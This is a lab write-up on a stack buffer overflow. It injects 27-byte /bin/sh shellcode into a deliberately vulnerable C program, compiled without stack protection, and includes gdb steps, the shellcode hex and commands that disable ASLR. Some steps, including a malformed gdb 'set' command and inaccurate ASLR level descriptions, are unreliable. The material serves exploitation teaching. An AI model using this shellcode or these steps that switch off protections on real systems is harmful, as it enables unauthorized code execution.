# Understand InjectionCode 
In reality, we don't actually know how long is the stackframe is, so we need to determine how long is it by adding bytes to examine! The task is to load the shellcode into the buffer in the vulnerable program, then insert it into the return address so that the program returns and executes the command I just inserted into the buffer.
## Stackframe
![image](https://github.com/user-attachments/assets/45d28a14-09e3-448e-9ad8-5e3c82b7cd99)
## Vulnerbility
In buf, we can redirect the return address to our assembly code to run our own code!
# Start attacking with InjectionCode 
## Compiling sh.asm file in order to use later
- `nasm -g -f elf sh.asm` or `nasm -f elf32 sh.asm -o sh.o` if the file is existed    
- `ld -m elf_i386 sh.o -o sh sh.o`  
![image](https://github.com/user-attachments/assets/a1d163e7-fb87-4dd8-b958-7ab4893fb80d)
![image](https://github.com/user-attachments/assets/34da393b-eca5-491c-9092-1cdfa8ec6c95)
## Get the hex string of the shellcode
- `for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo`
![image](https://github.com/user-attachments/assets/6a6fe454-3a88-4ba7-ad41-5e24d06c9757)
=> With each x is a byte => we have 27 bytes
## Start attacking
- Compile the vuln.c file `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
![image](https://github.com/user-attachments/assets/59643489-9be9-40d2-bd46-56df9be508bd)  
- To execute code on stack, we need to create new shell! type `sudo ln -sf /bin/zsh /bin/sh` with password: dees
![image](https://github.com/user-attachments/assets/46290e78-f765-4ab3-86d9-a03b63c68962)
- Load the file to gdb to examine `gdb -q vuln.out`
![image](https://github.com/user-attachments/assets/71f61be6-604e-429c-8b6f-6b451ea430b7)
- Type `disas main` to see the assembly code
![image](https://github.com/user-attachments/assets/e48f3b4d-e61d-4431-8b0f-4d760b1ee3fb)  
=> At this stage, we will now add 2 breakpoints to see how the code we inject affect the stack!  
- Set at +6, after the stack frame is established `b *0x08048441`
  ![image](https://github.com/user-attachments/assets/a3d3478f-9972-434b-9179-7d420b293451)
- Set at +48, before strcpy, we notice that eax has been pushed twice, meaning esp has now decreased by 8 bytes `b *0x0804846b`
  ![image](https://github.com/user-attachments/assets/88216630-ceeb-49f2-99b9-e3673a504d8e)
- Now we run the python code with `r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a'*41 + '\xff\xff\xff\xff')")`
 => See where the **\xff\xff\xff\xff** at
 ![image](https://github.com/user-attachments/assets/81c15458-dc77-471e-919b-1bc159f401b5)
 => At each step, we use `x/80xb $esp` to see the code from esp to lower
 ![image](https://github.com/user-attachments/assets/1a8a1a62-1e4c-4e78-ba2d-90365c5c5eb4)
    * We notice that the shellcode hasn't been inserted!
 => To go on, we use `continue`
 ![image](https://github.com/user-attachments/assets/6ce01ee3-bd39-42bb-9765-6d0add497f62)
    * From now, when we do `x/80xb $esp`, we can see our code that we injected before!
      ![image](https://github.com/user-attachments/assets/c064f0b2-cc47-438c-8d87-6943f7d06020)
    * the **0xff 0xff 0xff 0xff** is at the address 0xffffd6a8 (Because memory starts from address 0 - 15, corresponding to 0 - F in hexadecimal, the first 0xff byte will have a memory address starting with 0xffffd6a8)
- We set that new address to the esp by using `set *0xffffdec=#esp` => Thus, the address in the return address (ret addr) has been replaced by the esp (stack pointer), causing the program to return and continue executing instructions within the stack frame.
  ![image](https://github.com/user-attachments/assets/2f4f1fb7-53bf-4cca-948d-144d5206e5b5)
- If we type continue we will receive this signal => You did the right way!
  ![image](https://github.com/user-attachments/assets/70420abe-e18e-41d3-bccc-3c74056f16d9)
## To disable Address Space Layout Randomization (ASLR), which is responsible for the randomization of memory addresses, you can follow these steps
`sudo sysctl -w kernel.randomize_va_space=0` with password: **dees**  
## If you want to turn it on again please
do `sudo sysctl -w kernel.randomize_va_space=2`  
- 2 means on both heap and stack
  ![image](https://github.com/user-attachments/assets/c81211de-3710-4d2b-9ca6-2fdf4c2b325f)
- 1 means for only stack
  ![image](https://github.com/user-attachments/assets/df985c95-1dca-4f8a-908f-8cc99afaa8cf)
- 0 means not for both
  ![image](https://github.com/user-attachments/assets/a920732c-cafb-4b9f-a8f1-6ee3ea9a4fbd)
